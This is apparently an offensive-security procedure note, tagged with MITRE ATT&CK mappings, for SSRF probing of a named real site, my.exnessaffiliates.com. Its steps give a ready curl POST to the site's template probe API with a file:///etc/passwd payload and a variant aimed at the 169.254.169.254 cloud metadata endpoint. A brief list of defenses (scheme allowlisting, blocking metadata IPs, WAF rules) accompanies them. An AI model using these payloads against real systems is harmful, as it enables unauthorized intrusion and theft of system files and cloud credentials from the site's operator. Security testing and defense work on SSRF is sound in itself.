---
id: proc-exness-protocol-tests
tags:
  - ssrf
  - protocol-bypass
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/post-probe-file-protocol]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.635Z'
skill_level: advanced
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Dangerous-Protocols-and-Further-Enumerations

## Summary

This procedure probes non-HTTP protocols (file://, gopher://, etc.) and additional ports/IPs via SSRF to test for deeper access or bypasses, though limited by WAF.

## Description

Attempts to access file:// for local files, gopher:// for SMTP/IMAP, and targets like 169.254.169.254 (IMDS); uses redirects for port 1068. Reveals WAF/Network Policy blocks in protected environments.

## Requirements

1. SSRF confirmed
2. curl

## Defense

Defensive measures and detection strategies:

- Whitelist only http/https schemes
- Block localhost and metadata IPs explicitly
- WAF rules for protocol anomalies

## Objectives

1. Test for protocol escalation
2. Enumerate via redirects
3. Confirm access limits

## Instructions

### Step 1: Test File Protocol

**Context**: Attempt local file access.

**Command** ([[commands/post-probe-file-protocol]]):

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe \
  -H "Content-Type: application/json" \
  -d '{"data":{"url":"file:///etc/passwd"}}'
```

> Typically blocked; observe WAF error.

### Step 2: Test Metadata IP

**Context**: Target AWS/GCP metadata.

Modify to {"data":{"url":"http://169.254.169.254/latest/meta-data"}}; expect block.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/post-probe-file-protocol]]

## Tools Used


## Tags

- ssrf
- protocol-bypass
- metadata
